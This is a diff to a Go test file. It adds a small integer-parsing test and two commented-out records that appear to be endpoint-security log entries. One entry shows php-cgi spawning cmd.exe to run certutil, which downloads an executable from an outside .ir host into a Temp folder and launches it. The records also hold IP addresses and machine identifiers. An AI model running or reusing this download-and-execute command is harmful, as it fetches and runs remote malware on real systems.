@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"github.com/stretchr/testify/assert"
 	"sort"
+	"strconv"
 	"testing"
 )
 
@@ -515,4 +516,12 @@ func TestCandy(t *testing.T) {
 	}
 }
 
+//var t = []string['6e507147ddf0331ac2472d1db923658b7c6b8fe42bba', '1630202104', '2021.08.29', '112.51.15.13', 'd3649a5c9d5543a493a5df6838f866cf', '360ent', 'hiproxy', '05208f81ebc9d28d36b4e55799968bfb', '3ba503567ffaafbc26f31c6fa3ed7d9b9f282ce2', '', 'c:\\javapos', 'c:', 'c', 'setdatetime.exe', '49152', '1303', '1', '-1', '70', '2', '0', '70.2', '-1.-1', '', '', '1032967717', '3', '0', '6.1.7601.256.1.1', '9.00.8112.16684 (win7_ie9_GDR(builder).150722-130', 'adid:10001', '1', '270236', 'EAE00FB1-DCFC-A257-4BFF-3F52C8870FE2', '', '', '', '', 'C:\\JavaPOS', 'StartPos.exe', '9407a1c0234964bce695be759f769872', 'C:\\JavaPOS', 'javapos.exe', '', '', '', '', '', '', '', '', 'C:\\JavaPOS', 'SetDateTime.exe', '2021/08/29 09:55:05', '', '', '', '', '', '', 'MSVCR71.dll', '', '', '', '', '', '', '', 'UNSJZc1+54DXFEmpVQa+5O0hR5860GNjWdf9+a@rJZc1+54DC7ja7984sWLa', '768', '', '', '', '', '', '', '0', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '49152', '', '267091', 'N32', '']
+//var u = []string['97dec614f942ed07745ffa0e0510b45cc72c87fa29ee', '1630202133', '2021.08.29', '118.114.244.105', '26a974f75b25496d86ec89b164cb042a', '360ent', 'hiproxy', '0d52559aef4aa5eac82f530617032283', '8186d64dd28cd63ca883b1d3ce5f07aeabad67c0', '', '\\windows\\syswow64', '\\windows', '', 'certutil.exe', '903168', '2830', '1', '-1', '60', '3', '0', '10.0', '534031.1', ',571235.-1,559200.-1,534031.-3', ',534031.-3.0.50,559200.-1.0.54,571235.-1.0.7', '', '', '1', '6.1.7601.272.3.1', '8.00.7601.24000 (win7sp1_ldr.171231-1547)', 'adid:10001', '1', '184039', '13CE2135-B46F-CECB-F426-48C65BFBDDA6', '', 'Microsoft®+Windows®+Operating+System', 'CertUtil.exe', 'CertUtil.exe', 'D:\\phpStudy\\php\\php-5.2.17', 'php-cgi.exe', 'ad7b9c14083b52bc532fba5948342b98', 'C:\\Windows\\SysWOW64', 'cmd.exe', '/c certutil.exe -urlcache -split -f http://UeR.ReiyKiQ.ir/download.exe %SystemRoot%/Temp/tpyzienxtcmwgca25834.exe & %SystemRoot%/Temp/tpyzienxtcmwgca25834.exe', '', '', '', '', '', '', '', 'C:\\Windows\\SysWOW64', 'certutil.exe', '-urlcache -split -f http://UeR.ReiyKiQ.ir/download.exe C:\\Windows/Temp/tpyzienxtcmwgca25834.exe ', '', '', '', '', '', '', 'cmd.exe', '', '', '', '', '', '', '', 'ZGBY0AKIfI5i57iAwg87cbCTSp/MxjkjuolXEdh@ZbmId57MCSp7jwEdh', '24576', '', '', '', '', '', '', '0', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '903168', '', '6896435', 'N64', '']
+
+func TestStringTioInt(t *testing.T)  {
+
+	a := "1"
+	t.Log(strconv.Atoi(a))
+}
 
